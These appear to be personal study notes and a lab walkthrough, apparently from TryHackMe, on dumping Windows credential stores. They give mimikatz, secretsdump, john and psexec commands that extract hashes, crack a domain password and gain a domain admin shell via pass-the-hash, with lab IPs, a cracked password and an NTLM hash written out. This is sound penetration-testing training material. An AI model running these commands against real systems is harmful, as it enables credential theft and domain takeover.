

# credential stores

### LSASS memory
```
Local Security Authority Subsystem Service

enforces Windows security policies and manages authentication

also holds sensitive credential material in memory
```

`mimikatz sekurlsa::logonpasswords sekurlsa::minidump` to extract

### SAM + SYSTEM Hives
```
SAM = Security Accounts Manager

Windows registry db with hashes for local user accounts (local admins aswell)

decrypting the hashes requires the Bootkey from SYSTEM hive

you need SYSTEM privileges
```

SAM hive sits at `%SystemRoot%\system32\config\SAM`

SYSTEM hive at `%SystemRoot%\system32\config\SYSTEM`

`mimikatz lsadump::sam vssadmin` to extract

### LSA secrets

```
cached domain credentials, cleartext passwords, RDP credentials

SYSTEM or Admin privileges required
```

LSA secrets registry key: `HKLM\SECURITY\Policy\Secrets`

`secretsdump.py` from Impacket can dump LSA secrets (with admin creds)

### DPAPI Vault

```
Saved passwords from apps (RDP, browsers, WiFi)
```

`mimikatz vault::list vault::cred /export` to extract

# Practical

for mimikatz I already included the commands, just open a mimikatz prompt and run them (without the `mimikatz` prefix)

(secrets) dump hashes with local admin

`secretsdump.py WRK/Administrator:N3w34829DJdd?1@10.220.10.20 -output local_dump`


we got a hash and saved it to dc2_hash.txt, now john time:

`john --format=mscash2 dc2_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`

the password was `lasvegas1` lol

now that we have domain admins creds, we can rerun secretsdump targeting the DC:

`secretsdump.py TRYHACKME/drgonzo:lasvegas1@10.220.10.10 -just-dc -output dc_dump`

we got domain admin's NTLM hash, which can be used with pass-the-hash authentication (no password needed)

`psexec.py 'TRYHACKME/Administrator@10.220.10.10' -hashes :d71ee9fb6a3f54496bdc6c941f7a2903`

now we have a shell as domain admin

--- the end ---